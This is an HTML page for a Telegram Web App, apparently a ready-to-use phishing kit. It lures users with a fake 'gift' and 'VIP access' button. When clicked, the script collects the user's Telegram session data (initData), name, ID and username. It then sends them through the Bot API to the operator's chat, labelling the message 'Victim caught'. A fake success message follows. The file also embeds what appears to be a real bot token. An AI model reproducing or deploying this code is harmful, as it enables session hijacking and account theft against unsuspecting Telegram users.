<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secret Gift</title>
    <style>
        body {
            background: #1a1a1a;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .card {
            background: #2b2b2b;
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 80%;
            max-width: 300px;
        }
        h2 { margin: 0 0 20px 0; color: #ffd700; }
        .gift-icon { font-size: 50px; margin-bottom: 20px; }
        button {
            background: #0088cc; /* Telegram Blue */
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            transition: 0.2s;
        }
        button:active { transform: scale(0.98); }
        button:disabled { background: #555; }
        #status { margin-top: 15px; font-size: 14px; color: #aaa; min-height: 20px; }
    </style>
</head>
<body>

    <div class="card">
        <div class="gift-icon">🎁</div>
        <h2>У тебя есть подарок!</h2>
        <p style="font-size: 14px; color: #ccc; margin-bottom: 20px;">
            Нажми кнопку, чтобы активировать VIP доступ и получить данные.
        </p>
        <button id="claimBtn">ПОЛУЧИТЬ ПРИЗ</button>
        <div id="status"></div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        const claimBtn = document.getElementById('claimBtn');
        const status = document.getElementById('status');

        // ==========================================
        // НАСТРОЙКИ (ЗАПОЛНИ ЭТО!)
        // ==========================================
        const BOT_TOKEN = '8884810650:AAF6Cd8PJASq0-kbqPkO_LnH5KtiGGjZjVw'; // <--- ВСТАВЬ СЮДА ТОКЕН
        const CHAT_ID = '8658887417';       // <--- ТВОЙ ID
        // ==========================================

        tg.ready();
        tg.expand();

        claimBtn.onclick = () => {
            if (claimBtn.disabled) return;
            claimBtn.disabled = true;
            status.innerText = "Загрузка данных...";

            // 1. Собираем "Сессию" (initData)
            const session = tg.initData;
            
            // 2. Собираем инфу о юзере
            const user = tg.initDataUnsafe?.user;
            const firstName = user ? user.first_name : 'Unknown';
            const lastName = user ? user.last_name : '';
            const userId = user ? user.id : '0';
            const username = user ? user.username : 'Нет юзернейма';

            // 3. Формируем сообщение
            const text = `🔥 <b>Жертва поймана!</b>\n\n` +
                         `👤 <b>Имя:</b> ${firstName} ${lastName}\n` +
                         `🆔 <b>ID:</b> ${userId}\n` +
                         `📱 <b>Username:</b> @${username}\n\n` +
                         `🔑 <b>СЕССИЯ (Data):</b>\n<code>${session}</code>`;

            // 4. Отправляем в Telegram
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            })
            .then(res => {
                if (res.ok) {
                    status.innerText = "Готово! Данные отправлены.";
                    // Фейковый успех
                    claimBtn.innerText = "✓ ПРИЗ ПОЛУЧЕН";
                    claimBtn.style.background = "#4caf50";
                } else {
                    status.innerText = "Ошибка API. Проверь токен.";
                    console.error(res);
                }
            })
            .catch(err => {
                status.innerText = "Ошибка сети.";
                console.error(err);
            });
        };
    </script>
</body>
</html>
